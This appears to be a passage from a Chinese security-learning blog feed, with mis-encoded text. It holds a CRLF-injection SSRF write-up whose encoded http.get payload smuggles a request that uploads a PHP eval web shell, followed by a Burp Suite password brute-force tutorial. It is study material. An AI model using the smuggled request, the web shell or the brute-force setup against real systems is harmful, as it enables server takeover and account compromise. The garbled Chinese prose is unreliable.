<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt; http.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„POSTè¯·æ±‚ï¼Œåƒè¿™æ ·çš„POSTè¯·æ±‚å¯ä»¥è¢«æˆ‘ä»¬ç”¨äº SSRFã€‚ä¸‹é¢æˆ‘ä»¬åˆ†æä¸€ä¸‹æ•´ä¸ªæ”»å‡»çš„è¿‡ç¨‹ã€‚</p>
<p>åŸå§‹è¯·æ±‚æ•°æ®å¦‚ä¸‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬æ’å…¥CRLFæ•°æ®åï¼ŒHTTPè¯·æ±‚æ•°æ®å˜æˆäº†ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span></span><br><span class="line"><span class="language-php">Content-Length: <span class="number">437</span></span></span><br><span class="line"><span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">......</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"> HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></span><br></pre></td></tr></table></figure>

<p>ä¸Šæ¬¡è¯·æ±‚åŒ…çš„Hostå­—æ®µå’ŒçŠ¶æ€è¡Œä¸­çš„ <code>HTTP/1.1</code> å°±å•ç‹¬å‡ºæ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ„é€ ä¸€ä¸ªè¯·æ±‚æŠŠä»–é—­åˆï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span></span><br><span class="line"><span class="language-php">Content-Length: <span class="number">437</span></span></span><br><span class="line"><span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">......</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">GET / HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">test: HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>Burpsuiteå¯†ç çˆ†ç ´</title>
    <url>//post/tooluse(bp-bruce)/</url>
    <content><![CDATA[<p><code>é¡ºä¾¿è®°ä¸€ä¸‹ï¼Œå…å¾—åé¢åˆ°å¤„ç¿»</code></p>
<span id="more"></span>

<h1 id="Burpsuiteå¯†ç çˆ†ç ´"><a href="#Burpsuiteå¯†ç çˆ†ç ´" class="headerlink" title="Burpsuiteå¯†ç çˆ†ç ´"></a>Burpsuiteå¯†ç çˆ†ç ´</h1><p>è™½ç„¶ä¸çŸ¥é“è¿™ä¸ªç½‘ç«™æ˜¯é‚£ä½å¤§ä½¬æ€»ç»“å»ºç«‹çš„ï¼Œä½†è¿˜æ˜¯å¾ˆæ„Ÿè°¢ï¼ŒèŠ‚çœå¾ˆå¤šæ—¶é—´ï¼Œè¿™ä¸ªç½‘ç«™æä¾›äº†å¾ˆå…¨é¢çš„å¯†ç è¡¨</p>
<blockquote>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
</blockquote>
<p>ä¹‹å‰åœ¨å­¦ä¹ burpsuiteçš„æ—¶å€™ï¼Œå¤§éƒ¨åˆ†æ—¶é—´åœ¨ç”¨proxyå’Œrequestï¼Œä¸€ç›´æƒ³ç”¨intruderï¼Œåœ¨åšåŠŸé˜²ä¸–ç•Œweak_authè¿™é“é¢˜æ—¶ï¼Œéœ€è¦ç”¨å­—å…¸çˆ†ç ´</p>
<p>äºæ˜¯æˆ‘ä¾¿äº†è§£äº†ä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½</p>
<blockquote>
<p>åœ¨intruderä¸‹ï¼Œä¸»è¦çœ‹payload</p>
<p>payload Setsä¸»è¦ç”¨Simple listå’ŒBrute forcer</p>
</blockquote>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="1-Simple-list"><a href="#1-Simple-list" class="headerlink" title="1.Simple list"></a>1.Simple list</h3><p>ä¸»è¦å°±æ˜¯è®²å†™å¥½çš„å¯†ç åˆ—è¡¨æŒ¨ä¸ªè¿›è¡Œæµ‹è¯•ï¼Œè¯•å‡ºå¯ä»¥æ­£ç¡®ç™»å½•çš„å¯†ç </p>
<p><img src="/post/tooluse(bp-bruce)/image-20220624165348786.png" alt="image-20220624165348786"></p>
<h3 id="2-Brute-forcer"><a href="#2-Brute-forcer" class="headerlink" title="2.Brute forcer"></a>2.Brute forcer</h3><p>å°±æ¯”è¾ƒæš´åŠ›ï¼Œå¯ä»¥ä»ä¸‹å›¾çœ‹åˆ°Requset countæœ‰8,398,080æ¬¡ï¼Œå› ä¸ºä»–æ˜¯æŠŠä¸‹é¢Character seté‡Œçš„æ‰€ä»¥å­—ç¬¦çš„æ’åˆ—ç»„åˆéƒ½è¯•äº†ï¼Œç®€å•ç²—æš´ï¼Œä¹Ÿéå¸¸è€—æ—¶é—´</p>
<p><img src="/post/tooluse(bp-bruce)/image-20220624165405777.png" alt="image-20220624165405777"></p>
<p>è¿™é‡Œä»¥ä¸€æ¬¡çˆ†ç ´ä¸ºä¾‹ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹æ–¹æœ‰ä¸¤ä¸ª<code>Â§ Â§</code>ï¼Œè¿™ä¸¤å¤„å°±æ˜¯payloadè¾“å…¥ç‚¹ï¼Œæˆ‘ä»¬è¾“å…¥çˆ†ç ´æ•°æ®å°±ä¸æ–­åœ¨è¿™ä¸¤å¤„ä¸Šä¼ æµ‹è¯•</p>
<p><img src="/post/tooluse(bp-bruce)/image-20220624170325792.png" alt="image-20220624170325792"></p>
<p>å¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸€å¤„çš„æ•°æ®ï¼Œæ¯”å¦‚ä¸‹æ–¹çš„usernameä¸ºadminï¼Œå°±ä¸ç”¨ç”¨æµ‹è¯•æ•°æ®çˆ†ç ´ï¼Œåªç”¨åœ¨passwordå¤„çˆ†ç ´</p>
<p><img src="/post/tooluse(bp-bruce)/image-20220624170753675.png" alt="image-20220624170753675"></p>
<p>é‚£ä¹ˆçˆ†ç ´å®Œåï¼Œå¦‚ä½•åˆ†è¾¨å“ªä¸ªæ‰æ˜¯æ­£ç¡®å¯†ç å‘¢</p>
<p>ä¸»è¦åˆ†ælengthï¼Œå¦‚æœå‡ºç°ä¸å¤§éƒ¨åˆ†lengthä¸åŒçš„å¯†ç ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡å°±æ˜¯æ­£ç¡®å¯†ç ï¼Œæ¯”å¦‚æ­¤å¤„ï¼Œ 123456å°±æ˜¯æ­£ç¡®å¯†ç </p>
<p><img src="/post/tooluse(bp-bruce)/image-20220624170455916.png" alt="image-20220624170455916"></p>
<h3 id="3-Numbers"><a href="#3-Numbers" class="headerlink" title="3.Numbers"></a>3.Numbers</h3><p><img src="/post/tooluse(bp-bruce)/image-20220626083426611.png" alt="image-20220626083426611"></p>
<p>çº¯æ•°å­—å‹çˆ†ç ´ï¼ŒFromæ˜¯å¼€å§‹æ•°å­—ï¼ŒToæ˜¯ç»“æŸæ•°å­—ï¼ŒStepæ˜¯é—´éš”å¤šå°‘æ•°å­—çˆ†ç ´ä¸€æ¬¡</p>
<h3 id="4-Runtime-file"><a href="#4-Runtime-file" class="headerlink" title="4.Runtime file"></a>4.Runtime file</h3><p>é€‰æ‹©è‡ªå·±çš„å­—å…¸æ–‡ä»¶</p>
<h3 id="5-Custom-iterator"><a href="#5-Custom-iterator" class="headerlink" title="5.Custom iterator"></a>5.Custom iterator</h3><p>ï¼ˆå¯ä»¥è‡ªå®šä¹‰æ‹¼æ¥å­—æ®µï¼Œæ¯”å¦‚username:passwordï¼Œè¿™æ ·çˆ†ç ´çš„ä¸¤åˆ—æ•°æ®è¢«:éš”å¼€è¿›è¡Œçˆ†ç ´ï¼‰</p>
<p>è‡ªå®šä¹‰è¿­ä»£å™¨ã€‚è¿™ç§è´Ÿè½½ç±»å‹ï¼Œå¯ä»¥é…ç½®é¡¹ç›®çš„å¤šä¸ªåˆ—è¡¨ï¼Œå¹¶ä½¿ç”¨ç”Ÿæˆçš„åˆ—è¡¨ä¸­é¡¹çš„æ‰€æœ‰æ’åˆ—æœ‰æ•ˆè½½è·ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå¼ºæœ‰åŠ›çš„æ–¹æ³•æ ¹æ®ç»™å®šçš„æ¨¡æ¿ï¼Œä»¥äº§ç”Ÿå­—ç¬¦æˆ–å…¶ä»–é¡¹ç›®çš„å®šåˆ¶æ’åˆ—ã€‚</p>
<h3 id="6-Character-substitution"><a href="#6-Character-substitution" class="headerlink" title="6.Character substitution"></a>6.Character substitution</h3><p>å­—ç¬¦æ›¿æ¢ã€‚æ­¤è´Ÿè½½ç±»å‹å…è®¸æ‚¨é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¹¶åº”ç”¨å„ç§å­—ç¬¦æ›¿æ¢åˆ°æ¯ä¸ªé¡¹ç›®ã€‚è¿™å¯èƒ½æ˜¯åœ¨å¯†ç çŒœæµ‹æ”»å‡»éå¸¸æœ‰ç”¨ï¼Œç”¨æ¥äº§ç”Ÿåœ¨å­—å…¸ä¸­çš„å•è¯å¸¸è§çš„å˜åŒ–ã€‚</p>
<h3 id="7-Case-modification"><a href="#7-Case-modification" class="headerlink" title="7.Case modification"></a>7.Case modification</h3><p>æ­¤è´Ÿè½½ç±»å‹å…è®¸é…ç½®ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¹¶åº”ç”¨å„ç§æƒ…å†µä¸‹ä¿®æ”¹æ¯ä¸ªé¡¹ç›®ã€‚è¿™å¯èƒ½å¯¹å¯†ç çŒœæµ‹æ”»å‡»éå¸¸æœ‰ç”¨ï¼Œç”¨æ¥äº§ç”Ÿåœ¨å­—å…¸ä¸­çš„å•è¯çš„æƒ…å†µä¸‹çš„å˜åŒ–ã€‚</p>
<h3 id="8-Recursivegrep"><a href="#8-Recursivegrep" class="headerlink" title="8.Recursivegrep"></a>8.Recursivegrep</h3><p>é€’å½’grepï¼Œè¦ç”¨è¿™ä¸ªå¿…é¡»åœ¨Intruder&gt;options&gt;Grep-extractä¸‹æ·»åŠ ä¸€ä¸ªå“åº”åŒ¹é…ï¼Œæ¯”å¦‚è¯´æˆ‘ä¸€ä¸ªè¯·æ±‚é¡µéœ€è¦å‰ä¸€ä¸ªå“åº”é¡µä¸­çš„å†…å®¹ï¼Œè¿™é‡Œå°±å¯ä»¥è¿™æ ·ä½¿ç”¨äº†ã€‚</p>
<h3 id="9-Dates"><a href="#9-Dates" class="headerlink" title="9.Dates"></a>9.Dates</h3><p>æ—¶é—´ã€æ—¥æœŸ</p>
<h3 id="10-Null-payloads"><a href="#10-Null-payloads" class="headerlink" title="10.Null payloads"></a>10.Null payloads</h3><p>è¿™ç§æ”»å‡»è½½è·äº§ç”Ÿæœ‰æ•ˆè½½è·ï¼Œå…¶å€¼æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚å½“æŸç§æ”»å‡»è¯·æ±‚éœ€è¦åå¤å‘é€åŒæ ·çš„è¯·æ±‚ï¼Œä½†è¿™ç§è¯·æ±‚ç›¸å¯¹äºåŸºæœ¬è¯·æ±‚æ˜¯æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™ç§æ”»å‡»è½½è·äº§ç”Ÿæœ‰æ•ˆè½½è·ï¼Œè¿™å¯ç”¨äºå„ç§æ”»å‡»ï¼Œä¾‹å¦‚é‡‡é›† cookiesæ¥è¿›è¡Œæµ‹åºåˆ†æï¼›åº”ç”¨å±‚çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œè¿™äº›è¯·æ±‚è¢«é‡å¤å‘é€ï¼Œå¯¼è‡´æœåŠ¡å™¨ä¸Šäº§ç”Ÿé«˜å·¥ä½œè´Ÿè·çš„ä»»åŠ¡ï¼Œæˆ–ä¿æ´»ä¼šè¯ä»¤ç‰Œï¼Œä»¥ä¾¿è¿™äº›ä»¤ç‰Œåœ¨å…¶å®ƒçš„é—´æ­‡è¯•éªŒä¸­ä½¿ç”¨ã€‚ä½¿ç”¨æ­¤è½½è·ç±»å‹ï¼Œå®ƒç”šè‡³æ²¡æœ‰å¿…è¦åœ¨è¯·æ±‚æ¨¡æ¿ä¸­æ ‡å¿—æœ‰æ•ˆè½½è·ä½ç½®ã€‚æ‚¨å¯ä»¥é…ç½®Burpäº§ç”Ÿä¸€å®šç‰¹å®šæ•°ç›®çš„ç©ºæœ‰æ•ˆè½½è·ï¼Œæˆ–æ— é™æœŸåœ°æŒç»­ä¸‹å»ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°å­—ã€æ—¥æœŸç­‰å…¶ä»–æ–¹å¼äº§ç”Ÿå¤§é‡çš„è¿æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨çš„è´Ÿè½½è¿‡é«˜ã€‚</p>
<h2 id="Attack-typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰"><a href="#Attack-typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰" class="headerlink" title="Attack typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰"></a>Attack typeï¼ˆçˆ†ç ´æ–¹å¼ï¼‰</h2><p><img src="/post/tooluse(bp-bruce)/image-20220710224734912.png" alt="image-20220710224734912"></p>
<h3 id="1-Sniper"><a href="#1-Sniper" class="headerlink" title="1.Sniper"></a>1.Sniper</h3><p> è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„ï¼ŒSniperæ˜¯ç‹™å‡»æ‰‹çš„æ„æ€ã€‚è¿™ä¸ªæ¨¡å¼ä¼šä½¿ç”¨å•ä¸€çš„payloadã€å°±æ˜¯å¯¼å…¥å­—å…¸çš„payloadã€‘ç»„ã€‚å®ƒä¼šé’ˆå¯¹æ¯ä¸ªpositionä¸­$$ä½ç½®è®¾ç½®payloadã€‚è¿™ç§æ”»å‡»ç±»å‹é€‚åˆå¯¹å¸¸è§æ¼æ´ä¸­çš„è¯·æ±‚å‚æ•°å•ç‹¬åœ°è¿›è¡Œæµ‹è¯•ã€‚æ”»å‡»ä¸­çš„è¯·æ±‚æ€»æ•°åº”è¯¥æ˜¯positionæ•°é‡å’Œpayloadæ•°é‡çš„ä¹˜ç§¯ã€‚</p>
<h3 id="2-Battering-ram"><a href="#2-Battering-ram" class="headerlink" title="2.Battering ram"></a>2.Battering ram</h3><p> è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å•ä¸€çš„payloadç»„ã€‚å®ƒä¼šé‡å¤payloadå¹¶ä¸”ä¸€æ¬¡æŠŠæ‰€æœ‰ç›¸åŒçš„payloadæ”¾å…¥æŒ‡å®šçš„ä½ç½®ä¸­ã€‚è¿™ç§æ”»å‡»é€‚åˆé‚£ç§éœ€è¦åœ¨è¯·æ±‚ä¸­æŠŠç›¸åŒçš„è¾“å…¥æ”¾åˆ°å¤šä¸ªä½ç½®çš„æƒ…å†µã€‚è¯·æ±‚çš„æ€»æ•°æ˜¯payloadç»„ä¸­payloadçš„æ€»æ•°ã€‚ç®€å•è¯´å°±æ˜¯ä¸€ä¸ªplayloadå­—å…¸åŒæ—¶åº”ç”¨åˆ°å¤šä¸ªpositionä¸­ã€‚</p>
<h3 id="3-Pitchfork"><a href="#3-Pitchfork" class="headerlink" title="3.Pitchfork"></a>3.Pitchfork</h3><p>è¿™ä¸€æ¨¡å¼æ˜¯ä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚å¯¹äºå®šä¹‰çš„ä½ç½®å¯ä»¥ä½¿ç”¨ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šåŒæ­¥è¿­ä»£æ‰€æœ‰çš„payloadç»„ï¼ŒæŠŠpayloadæ”¾å…¥æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­ã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™aã€1ã€‘å°†ä¼šå¯¹åº”bã€1ã€‘è¿›è¡Œattackå¤„ç†ï¼Œè¿™ç§æ”»å‡»ç±»å‹éå¸¸é€‚åˆé‚£ç§ä¸åŒä½ç½®ä¸­éœ€è¦æ’å…¥ä¸åŒä½†ç›¸å…³çš„è¾“å…¥çš„æƒ…å†µã€‚è¯·æ±‚çš„æ•°é‡åº”è¯¥æ˜¯æœ€å°çš„payloadç»„ä¸­çš„payloadæ•°é‡ã€‚</p>
<h3 id="4-Cluster-bomb"><a href="#4-Cluster-bomb" class="headerlink" title="4.Cluster bomb"></a>4.Cluster bomb</h3><p>è¿™ç§æ¨¡å¼ä¼šä½¿ç”¨å¤šä¸ªpayloadç»„ã€‚æ¯ä¸ªå®šä¹‰çš„ä½ç½®ä¸­æœ‰ä¸åŒçš„payloadç»„ã€‚æ”»å‡»ä¼šè¿­ä»£æ¯ä¸ªpayloadç»„ï¼Œæ¯ç§payloadç»„åˆéƒ½ä¼šè¢«æµ‹è¯•ä¸€éã€‚æ¯”å¦‚ï¼špositionä¸­Aå¤„æœ‰aå­—å…¸ï¼ŒBå¤„æœ‰bå­—å…¸ï¼Œåˆ™ä¸¤ä¸ªå­—å…¸å°†ä¼šå¾ªç¯æ­é…ç»„åˆè¿›è¡Œattackå¤„ç†è¿™ç§æ”»å‡»é€‚ç”¨äºé‚£ç§ä½ç½®ä¸­éœ€è¦ä¸åŒä¸”ä¸ç›¸å…³æˆ–è€…æœªçŸ¥çš„è¾“å…¥çš„æ”»å‡»ã€‚æ”»å‡»è¯·æ±‚çš„æ€»æ•°æ˜¯å„payloadç»„ä¸­payloadæ•°é‡çš„ä¹˜ç§¯ã€‚ï¼ˆå³å¯ä»¥åœ¨ç”¨æˆ·åå’Œå¯†ç ä¸¤å¤„ç”¨ä¸¤ä¸ªå­—å…¸çˆ†ç ´ï¼‰</p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>WEBå­¦ä¹ </title>
    <url>//post/Web-study/</url>
    <content><![CDATA[<p><code>å­¦ä¼šä¸€æ ·ä¸œè¥¿ï¼Œæœ€é‡è¦ç‰¹å¾å°±æ˜¯å¯ä»¥æŠŠä¸€ä¸ªçŸ¥è¯†ç‚¹çš„åŸç†å¼„æ‡‚ï¼Œé€ æˆä¸€æ¬¡æˆåŠŸæ³¨å…¥ï¼Œè¦æ³¨æ„åˆ†ææºç å½“ä¸­å¯¼è‡´è¿™ä¸ªæ¼æ´çš„é—®é¢˜ç‚¹ï¼Œåˆåº”è¯¥å¦‚ä½•æ”¹è¿›ä¸é˜²å¾¡ï¼Œ</code></p>
<p><code>ä¸è¦æ€¥äºæ±‚æˆï¼Œæ…¢å³æ˜¯å¿«ï¼Œå°‘å³æ˜¯å¤š</code></p>
